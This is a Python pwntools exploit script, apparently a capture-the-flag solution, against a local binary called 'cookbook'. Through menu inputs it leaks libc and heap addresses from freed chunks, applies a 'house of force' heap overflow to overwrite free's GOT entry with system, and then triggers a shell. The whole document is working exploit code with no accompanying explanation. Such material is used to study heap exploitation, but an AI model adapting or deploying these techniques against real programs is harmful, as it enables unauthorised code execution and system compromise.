#!/usr/bin/env python
#  -*- coding: utf-8 -*-
from pwn import *

p = process(["./cookbook"])

p.recvuntil("what's your name?\n")
p.sendline("/bin/sh")

p.recvuntil("[q]uit\n")
p.sendline("a")

p.recvuntil("(doesn't quit)?\n")  # allocate an chunk(0x100) : chunk1
p.sendline("n")

p.recvuntil("(doesn't quit)?\n")
p.sendline("q")

p.recvuntil("[q]uit\n")
p.sendline("g")
p.recvuntil("hacker!) : ")
p.sendline("c") # chunk2
p.sendline("dummy")

p.recvuntil("[q]uit\n")
p.sendline("g")
p.recvuntil("hacker!) : ")
p.sendline("90") #chunk3
p.sendline("dummy")

p.recvuntil("[q]uit\n")
p.sendline("c")

p.recvuntil("[q]uit\n")
p.sendline("n") #chunk4

p.recvuntil("[q]uit\n")
p.sendline("q")

p.recvuntil("[q]uit\n")
p.sendline("R") #free chunk3

p.recvuntil("[q]uit\n")
p.sendline("a")

p.recvuntil("quit)?\n")
p.sendline("d")
p.recvuntil("quit)?\n")
p.sendline("n")

p.recvuntil("quit)?\n")
p.sendline("l")

p.recvline()
calory = int(p.recvline().split(" ")[1][0:-1])
if calory < 0:
    calory += 0x100000000
libc_part = calory

price  = int(p.recvline().split(" ")[1][0:-1])
if price < 0:
    price += 0x100000000
heap_part = price

libcbase = libc_part + 8 - 0x1b27b8
heapbase = heap_part - 0x12a8

print "libcbase : ", hex(libcbase)
print "heapbase : ", hex(heapbase)

raw_input(":")

p.recvuntil("quit)?\n")
p.sendline("q")

p.recvuntil("[q]uit\n")
p.sendline("c")

p.recvuntil("[q]uit\n")
p.sendline("g")
p.sendline("\xff" * (0x40C - 2))

p.recvuntil("[q]uit\n")
p.sendline("q")

p.recvuntil("[q]uit\n")
p.sendline("g")

free_got = 0x804d018
old_top = heapbase + 0x17f8
new_top = free_got - 0x8

req = new_top - old_top - 0x4

if req < 0:
    req += 0x100000000

print "req: " , hex(req)

p.recvuntil("hacker!) : ")
p.sendline(hex(req))
p.sendline("house of force!")


p.recvuntil("[q]uit\n")
p.sendline("g")
p.recvuntil("hacker!) : ")
p.sendline("0x94")
p.sendline("spend the unsorted chunk")

p.recvuntil("[q]uit\n")
p.sendline("g")
p.recvuntil("hacker!) : ")
p.sendline("0xc")
system_addr = libcbase + 0x3ada0
p.sendline(p32(system_addr))

raw_input(":")

p.recvuntil("[q]uit\n")
p.sendline("g")
p.recvuntil("hacker!) : ")
p.sendline("0xc")
p.sendline("sh")

p.recvuntil("[q]uit\n")
p.sendline("R")

p.interactive()
